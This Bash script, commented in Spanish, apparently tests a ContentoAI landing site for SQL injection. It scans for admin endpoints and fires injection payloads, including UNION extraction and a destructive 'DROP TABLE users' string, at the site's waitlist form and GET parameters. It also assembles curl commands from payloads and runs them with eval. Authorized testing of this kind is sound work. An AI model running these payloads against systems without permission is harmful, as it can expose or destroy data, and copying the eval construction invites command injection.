#!/bin/bash

set -e

echo "=== Prueba de Sanitización SQL - ContentoAI (Bash) ==="
echo "Fecha: $(date)"

BASE_URL="https://contentoai.cenarbe.com"
LOG_FILE="/tmp/sql_test_$(date +%s).log"
VULN_FOUND=0

# Funciones de utilidad
log() {
    echo "$1" | tee -a "$LOG_FILE"
}

detect_sql_error() {
    local text="$1"
    # Patrones comunes de errores SQL
    local patterns=(
        "SQLSTATE"
        "Unknown column"
        "Table.*doesn't exist"
        "SQL syntax"
        "Column not found"
        "MySQL server"
        "Warning.*mysql"
        "Fatal error.*SQL"
        "Unclosed quotation mark"
        "Integrity constraint violation"
        "Duplicate entry"
        "Foreign key constraint fails"
        "Database error"
        "SQL error"
        "mysqli"
        "PDOException"
        "PostgreSQL.*ERROR"
    )
    for pattern in "${patterns[@]}"; do
        if echo "$text" | grep -q -i "$pattern"; then
            echo "$pattern"
            return 0
        fi
    done
    echo ""
    return 1
}

# 1. Obtener página principal y extraer formularios
log ""
log "--- 1. Analizando formularios en $BASE_URL ---"
PAGE_CONTENT=$(curl -s "$BASE_URL")
FORM_COUNT=$(echo "$PAGE_CONTENT" | grep -c "<form" || true)
log "Formularios encontrados: $FORM_COUNT"

# Extraer formulario de lista de espera (waitlist-form)
if echo "$PAGE_CONTENT" | grep -q "waitlist-form"; then
    log "✓ Formulario de lista de espera encontrado"
    # Extraer acción del formulario
    FORM_ACTION=$(echo "$PAGE_CONTENT" | grep -A 5 -B 5 "waitlist-form" | grep -o 'action="[^"]*"' | head -1 | sed 's/action="//;s/"//')
    if [[ -z "$FORM_ACTION" ]]; then
        FORM_ACTION="$BASE_URL"  # Enviar a misma página
    fi
    log "  Acción del formulario: $FORM_ACTION"
    
    # Extraer campos del formulario
    FORM_FIELDS=$(echo "$PAGE_CONTENT" | grep -A 20 "waitlist-form" | grep -o 'name="[^"]*"' | sed 's/name="//;s/"//' | sort -u)
    log "  Campos detectados: $(echo $FORM_FIELDS)"
else
    log "✗ No se encontró formulario de lista de espera"
fi

# 2. Probar endpoints de administración comunes
log ""
log "--- 2. Probando endpoints de administración ---"
ADMIN_ENDPOINTS=(
    "/admin"
    "/admin/login.php"
    "/admin/login"
    "/login"
    "/signin"
    "/wp-admin"
    "/administrator"
    "/backend"
    "/dashboard"
    "/api"
    "/api/waitlist"
    "/waitlist"
    "/submit"
    "/contact"
)

for endpoint in "${ADMIN_ENDPOINTS[@]}"; do
    url="${BASE_URL}${endpoint}"
    log -n "  Probando $url ... "
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || echo "000")
    if [[ "$HTTP_CODE" =~ ^(200|301|302|307|308)$ ]]; then
        log "EXISTE ($HTTP_CODE)"
        # Si es 200, podríamos probar inyección, pero omitimos por ahora
    else
        log "NO ($HTTP_CODE)"
    fi
done

# 3. Pruebas de inyección SQL básicas
log ""
log "--- 3. Pruebas de inyección SQL básicas ---"

# Payloads comunes de inyección SQL
SQL_PAYLOADS=(
    "' OR '1'='1"
    "\" OR \"1\"=\"1"
    "'; DROP TABLE users; --"
    "' OR 1=1 --"
    "' UNION SELECT NULL, NULL, NULL --"
    "' AND SLEEP(2) --"
    "' OR IF(1=1,SLEEP(2),0) --"
    "1' ORDER BY 1--"
    "1' UNION SELECT database(),user(),version()--"
)

# Si encontramos formulario de waitlist, probarlo
if [[ -n "$FORM_FIELDS" ]]; then
    log "Probando formulario de lista de espera con payloads SQL..."
    for payload in "${SQL_PAYLOADS[@]}"; do
        log "  Payload: $payload"
        # Construir datos del formulario
        FORM_DATA=""
        for field in $FORM_FIELDS; do
            if [[ "$field" =~ ^(email|e-mail)$ ]]; then
                FORM_DATA="${FORM_DATA} -F \"$field=test${payload// /_}@example.com\""
            elif [[ "$field" =~ ^(name|nombre|fullname)$ ]]; then
                FORM_DATA="${FORM_DATA} -F \"$field=$payload\""
            elif [[ "$field" =~ ^(planInterest|plan|interest)$ ]]; then
                FORM_DATA="${FORM_DATA} -F \"$field=basic\""
            else
                FORM_DATA="${FORM_DATA} -F \"$field=$payload\""
            fi
        done
        
        # Enviar solicitud POST (usando eval cuidadosamente)
        # Construir comando curl manualmente para evitar eval complejo
        CMD="curl -s -X POST \"$FORM_ACTION\""
        for field in $FORM_FIELDS; do
            if [[ "$field" =~ ^(email|e-mail)$ ]]; then
                CMD="$CMD -F \"$field=test${payload// /_}@example.com\""
            elif [[ "$field" =~ ^(name|nombre|fullname)$ ]]; then
                CMD="$CMD -F \"$field=$payload\""
            elif [[ "$field" =~ ^(planInterest|plan|interest)$ ]]; then
                CMD="$CMD -F \"$field=basic\""
            else
                CMD="$CMD -F \"$field=$payload\""
            fi
        done
        
        RESPONSE=$(eval "$CMD" 2>/dev/null || echo "ERROR en curl")
        ERROR_PATTERN=$(detect_sql_error "$RESPONSE")
        if [[ -n "$ERROR_PATTERN" ]]; then
            log "    !! VULNERABILIDAD SQL DETECTADA: $ERROR_PATTERN"
            VULN_FOUND=1
        else
            log "    ✓ Sin errores SQL visibles"
        fi
        
        sleep 1  # Evitar rate limiting
    done
else
    log "No se pudo probar formulario (campos no detectados)"
fi

# 4. Probar parámetros GET en URLs conocidas (si existen)
log ""
log "--- 4. Probando parámetros GET comunes ---"
# ContentoAI parece ser landing page estática, no tiene parámetros obvios
# Podríamos probar ?id=, ?page=, etc.
GET_PARAMS=("id" "page" "post" "article" "user" "admin" "debug")
for param in "${GET_PARAMS[@]}"; do
    url="${BASE_URL}/?${param}=${SQL_PAYLOADS[0]// /%20}"
    log -n "  Probando $param ... "
    RESPONSE=$(curl -s "$url")
    ERROR_PATTERN=$(detect_sql_error "$RESPONSE")
    if [[ -n "$ERROR_PATTERN" ]]; then
        log "VULNERABLE ($ERROR_PATTERN)"
        VULN_FOUND=1
    else
        log "ok"
    fi
    sleep 0.5
done

# Resumen
log ""
log "=== RESUMEN ==="
if [[ $VULN_FOUND -eq 0 ]]; then
    log "✓ No se detectaron vulnerabilidades SQL obvias"
    log "  (Nota: Estas pruebas son básicas. Auditoría completa requiere más pruebas.)"
    exit 0
else
    log "✗ SE DETECTARON POSIBLES VULNERABILIDADES SQL"
    log "  Revisar logs para detalles."
    exit 1
fi